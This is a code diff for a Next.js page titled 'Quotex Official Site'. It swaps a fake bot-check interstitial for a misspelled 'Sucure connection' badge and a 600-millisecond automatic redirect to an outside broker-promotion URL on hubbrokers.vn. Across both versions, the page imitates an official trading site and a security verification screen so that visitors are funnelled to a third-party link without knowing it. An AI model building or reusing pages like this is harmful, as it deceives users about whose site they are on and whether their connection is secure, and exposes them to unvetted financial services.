@@ -1,20 +1,19 @@
 'use client'
 import styles from "./page.module.css";
-import circel from "../../public/R-tron.png";
-import image from "../../public/image.png";
 import Image from "next/image";
-import { useEffect, useState } from "react";
+import circel from "../../../public/R-tron.png";
+import { FcOk } from "react-icons/fc";
+import { useEffect } from "react";
 
-export default function Home() {
-  const handleClick = () => {
-    window.location.href = "/qxbroker-connecting";
-  };
-
+export default function page() {
+    useEffect(() => {
+      const timeout = setTimeout(() => {
+        window.location.href = "https://www.hubbrokers.vn/top-fx-qxbroker";
+      }, 600);
+      return () => clearTimeout(timeout);
+      }, []);
   return (
-    <div
-    // onMouseMove={!isLoading && status ? handleMouseMove : null}
-    onClick={handleClick}
-    >
+    <div>
       <main className={styles.main}>
         <h3 className={styles.text}>
           Quotex Official Site{" "}
@@ -32,14 +31,10 @@ export default function Home() {
           Quotex
         </p>
         <div style={{ marginTop: 30 }}>
-          <Image src={image} alt="Logo" className={styles.image2} />
+          <span style={{display: 'inline-block', transform: 'translateY(8px)'}}><FcOk fontSize={30}/></span><span style={{marginLeft: 5}}>Sucure connection</span>
         </div>
-        <p className={styles.text4}>Why am I seeing this page?</p>
-        <p className={styles.text5}>
-          Requests from malicious bots can pose as legitimate traffic.
-          Occasionally, you may see this page while the site ensures that the
-          connection is secure.
-        </p>
+        <p className={styles.text4}>Proceeding...</p>
+       
       </main>
     </div>
   );
